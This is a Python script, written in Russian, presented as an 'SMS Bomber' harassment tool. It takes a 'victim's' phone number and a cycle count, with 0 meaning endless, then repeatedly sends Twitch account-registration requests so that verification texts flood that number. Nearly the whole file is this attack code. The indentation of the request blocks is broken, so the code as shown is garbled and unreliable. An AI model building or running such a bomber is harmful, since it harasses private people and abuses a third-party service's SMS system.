banner0 = '''
    ██████ ██   ██ ██████
    ██▒▒▒▒ ███ ███ ██▒▒▒▒
    ██████ ██▒█▒██ ██████
    ▒▒▒▒██ ██   ██ ▒▒▒▒██
    ██████ ██   ██ ██████
    ▒▒▒▒▒▒ ▒▒   ▒▒ ▒▒▒▒▒▒
    SMS Bomber, v0.2
    '''
banner1 = '''
    1 - Начать атаку
    2 - Информация о проекте
    '''
banner2 = '''  
    Разработчик: MatroCholo
    Сайт проекта: github.com/MatroCholo/sms-bomber
    '''

try:
    import random, datetime, sys, argparse, os
    from time import sleep
except ImportError:
    print('Критическая ошибка! Убедитесь, что Python 3.x верно установлен.')
    sys.exit(1)
try:
    import requests
except ImportError:
    print('Ошибка! Не удалось импортировать необходимые библиотеки.')
    print('Введите "pip install requests colorama" для исправления ошибки.')
    sys.exit(1)

def Logo():
    global phone
    global name
    global iteration
    print(banner0)
    print(banner1)
    iteration = 0
    name = ''
    settings = int(input('>>  '))
    if settings == 1:
        phone = input('Номер жертвы:  ')
        count = int(input('Количество циклов (0 - бесконечно):  '))
        if count == 0:
            while True:
                bombing()
                try:
                    iteration += 1
                    print(iteration, ' круг пройден. ')
                except:
                    break
        else:
            for i in range(count):
                bombing()
                try:
                    i += 1
                    print(i, ' круг пройден. ')
                except:
                    break
    if settings == 2:
        print(banner0)
        print(banner2)
              
    else:
        print('Secret Menu, v0.2 Ultra')
        lol = input('Enter password: ')
        print('"',lol,'"', 'is not the correct password. Exiting...')
        sys.exit(1)
        
def bombing():
    global phone
    global name
    global iteration
    if phone[0] == '+':
        phone = phone[1:]
    if phone[0] == '8':
        phone = '7' + phone[1:]
    if phone[0] == '9':
        phone = '7' + phone
    for x in range(12):
        name = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = name + random.choice(list('1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    email = name+f'{iteration}'+'@gmail.com'
    email = name+f'{iteration}'+'@gmail.com'

                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
                    try:
        requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': phone,'username': username})
        print('[+] Twitch отправлено!')
    except:
        print('[-] Не отправлено!')
        
Logo()